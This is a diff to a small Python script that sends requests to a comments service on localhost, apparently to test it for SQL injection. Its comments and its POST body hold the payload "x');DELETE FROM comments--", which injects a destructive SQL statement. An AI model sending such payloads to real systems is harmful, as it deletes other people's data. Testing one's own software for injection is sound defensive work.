@@ -11,6 +11,8 @@ import json
 # x');DELETE FROM comments--
 # x');SELECT * FROM comments--
 
+session = requests.session()
+
 def get(i):
     x = requests.get('http://localhost:5017/comments?from=-20000&count=10')
     print(f'\n\n============ {i}\n\n{x.text}')
@@ -22,7 +24,7 @@ def get(i):
 
 def post(i):
     url = 'http://localhost:5017/post'
-    x = requests.post(url, json={
+    x = session.post(url, json={
         'sender': f'testuser{i}\'s',
         'comment': "x');DELETE FROM comments--"
     })
